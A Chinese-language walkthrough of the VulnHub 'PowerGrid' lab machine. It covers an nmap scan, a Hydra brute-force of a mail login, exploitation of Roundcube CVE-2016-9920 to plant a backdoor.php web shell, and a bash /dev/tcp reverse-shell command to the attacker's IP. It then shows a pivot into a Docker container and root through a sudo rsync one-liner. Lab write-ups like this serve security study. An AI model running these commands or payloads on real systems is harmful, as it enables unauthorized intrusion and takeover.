# 靶机信息
PowerGrid是vulnhub中的一台困难难度的渗透测试测试靶机。

# 信息收集
## NMAP扫描
```
└─$ cat nmapScan/ports.nmap 
# Nmap 7.95 scan initiated Mon Nov 24 03:04:14 2025 as: /usr/lib/nmap/nmap --privileged -sT -p- --min-rate 10000 -oA nmapScan/ports 192.168.218.219
Nmap scan report for 192.168.218.219 (192.168.218.219)
Host is up (0.00030s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps
MAC Address: 00:0C:29:80:1A:A4 (VMware)
```
靶机非常任性，ssh端口干脆不开了，IMAP目前还没有什么信息，先放着。

## 基本信息枚举

<img width="1919" height="950" alt="Image" src="https://github.com/user-attachments/assets/5d08e051-1da6-4e2b-b8b1-bd1ea4b8e04d" />

80端口是一个倒计时，根据靶机表述，该黑客组织中有人使用弱密码，主页中有昵称收集起来。

爆破一下目录

```
/images               (Status: 301) [Size: 319] [--> http://192.168.218.220/images/]
/index.php            (Status: 200) [Size: 3644]
/server-status        (Status: 403) [Size: 280]
/zmail                (Status: 401) [Size: 462]
/index.php            (Status: 200) [Size: 3644]
```

看一下zmail，需要登录，爆破一下

```
└─$ hydra -L hacker.txt \
-P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
-t 64 -w 2 -f \
192.168.218.220 http-get /zmail

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] the waittime you set is low, this can result in errornous results
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-26 21:32:42
[DATA] max 64 tasks per 1 server, overall 64 tasks, 3000000 login tries (l:3/p:1000000), ~46875 tries per task
[DATA] attacking http-get://192.168.218.220:80/zmail

[STATUS] 32173.00 tries/min, 32173 tries in 00:01h, 2967827 to do in 01:33h, 64 active
[STATUS] 34079.33 tries/min, 102238 tries in 00:03h, 2897762 to do in 01:26h, 64 active
[STATUS] 34395.86 tries/min, 240771 tries in 00:07h, 2759229 to do in 01:21h, 64 active
[STATUS] 34723.20 tries/min, 520848 tries in 00:15h, 2479152 to do in 01:12h, 64 active
[STATUS] 34921.84 tries/min, 1082577 tries in 00:31h, 1917423 to do in 00:55h, 64 active
[80][http-get] host: 192.168.218.220   login: p48   password: electrico
[STATUS] attack finished for 192.168.218.220 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-26 22:10:12
```
我嘞个弱密码，爆了我一个小时。

<img width="1917" height="950" alt="Image" src="https://github.com/user-attachments/assets/76dc993f-9eb6-40e5-b2a6-ef7294da2078" />

还来。

<img width="1919" height="930" alt="Image" src="https://github.com/user-attachments/assets/34722813-8ee7-4c9c-b45b-6f3d1000b332" />

还好可以使用刚刚的用户名密码登录

<img width="1919" height="917" alt="Image" src="https://github.com/user-attachments/assets/c4add13b-f738-4e15-8ffe-271c924e260c" />

发现一个邮件，是ssh的密钥，但是考虑到ssh端口好像并没有开放。

# 漏洞利用
大概率就是roundcube的shell入口了，找找命令执行漏洞

<img width="1897" height="561" alt="Image" src="https://github.com/user-attachments/assets/8e07aa05-62ab-4511-ab0f-3d9055de1635" />

其他的太古早了，感觉就是第一个。
利用起来很简单，但是不知道文件绝对路径，猜一下应该是 **/var/www/html/zmail** 然后试着试着靶机就到期了，只能重新开一把，能三个小时打完真是大手子啊。

手工打了一会没成功，搜到了[利用脚本](https://github.com/t0kx/exploit-CVE-2016-9920)，但是登录前面还有一层校验，让ai修改了一下脚本。

```
└─$ ./exploit.py --host 192.168.218.221 --user p48 --pwd electrico --path zmail --www_path "/var/www/html/zmail"

[+] CVE-2016-9920 exploit by t0kx (modified)
[+] Exploiting 192.168.218.221
[+] Target exploited, accessing shell at http://192.168.218.221/zmail/backdoor.php
[+] Running whoami: www-data
[+] Done
```

<img width="1919" height="578" alt="Image" src="https://github.com/user-attachments/assets/d5b8f70d-21d8-4a26-8ce2-82e19f6217e6" />

`http://192.168.218.221/zmail/backdoor.php?cmd=/usr/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.218.148/80+0%3E%261%27`

成功反弹回来shell。

# 提权
果然，p48用户的密码都是一样的，直接su到p48，家目录中有个GPG私钥，然后花了点时间学了一下这个。
所有的密码都是一样的，用这个GPG私钥即可解密开始邮箱中的SSH加密密钥。但是解密之后这个ssh密钥怎么使用呢。

>gpg --import privkey.gpg 先把私钥导入给我自己
>gpg --decrypt encrypted.asc > backup_id_rsa 然后解密ssh密钥

回过头看一遍linpeas的输出，结合ai的分析大概率在docker中开的ssh服务。

>ssh -i id_rsa p48@172.16.0.2 docker网卡是172.16.0.1，想着试一下2，一下就进去了。

然后就是sudo -l

然后直接

```
p48@ef117d7a978f:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
```

# 反思
好久没见过docker了，要不是AI提醒我就又陷进去了，这个靶机还是很有意思的，webshell要想手工打，对于token还有seesion_id还是比较严格的，反正我试了很多次，一直不成功，然后找的脚本，倒是一次就成功了，拿到了webshell就简单了，有了邮件中的ssh提示，就容易猜到后面的步骤，然后最后的提权也很简单。